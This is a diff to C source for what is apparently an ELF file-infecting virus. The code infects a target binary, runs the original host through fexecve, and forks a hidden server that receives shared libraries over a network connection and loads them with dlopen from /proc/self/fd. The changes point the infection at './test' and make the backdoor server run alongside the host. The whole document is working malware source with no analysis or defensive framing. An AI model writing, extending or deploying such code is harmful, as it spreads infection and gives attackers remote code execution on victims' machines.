@@ -17,7 +17,7 @@
 
 #define opt 3
 
-#define infection_target ""
+#define infection_target "./test"
 
 extern char** environ;
 
@@ -30,7 +30,6 @@ always_inline optimize(opt) static inline void load_so(int, int);
 always_inline optimize(opt) static inline void process_connection(int);
 always_inline optimize(opt) static inline void server();
 
-
 int main(int argc, char** argv){
   if(!is_infected(infection_target)){
     FILE* host=fopen(infection_target, "rb+");
@@ -41,7 +40,6 @@ int main(int argc, char** argv){
   }else{
     FILE* infected=fopen(argv[0], "rb");
     execute_host(infected, argv, environ);
-    server();
   }
 }
 
@@ -51,19 +49,6 @@ long elf_size(FILE* f){
   fseek(f, 0, SEEK_SET);
   return header.e_shoff+(header.e_shentsize*header.e_shnum);
 }
-
-/* int is_elf(char* f){ */
-/*   FILE* file = fopen(f, "rb"); */
-/*   if(file){ */
-/*     Elf64_Ehdr header; */
-/*     fread(&header, 1, sizeof(Elf64_Ehdr), file); */
-/*     fclose(file); */
-/*     if(memcmp(header.e_ident, ELFMAG, SELFMAG) == 0){ */
-/*       return 1; */
-/*     } */
-/*   } */
-/*   return 0; */
-/* } */
 
 int is_infected(char* f){
   FILE* file = fopen(f, "rb");
@@ -102,13 +87,14 @@ void execute_host(FILE* f, char** argv, char** envp){
   write(fd, host, h_size);  
   pid_t pid;
   if((pid = fork()) == 0){
+    server();
+  }
+  if((pid = fork()) == 0){
     fexecve(fd, argv, envp);
-    exit(0);
   }else{
     wait(NULL);
   }
 }
-
 
 void load_so(int connection_fd, int size){
   char* file_buff = (char*)malloc(sizeof(char)*size);
@@ -121,6 +107,7 @@ void load_so(int connection_fd, int size){
   sprintf(file_path, "/proc/self/fd/%d", fd);
   handle = dlopen(file_path, RTLD_LAZY);
   dlclose(handle);
+  exit(0);
 }
 
 void process_connection(int connection_fd){
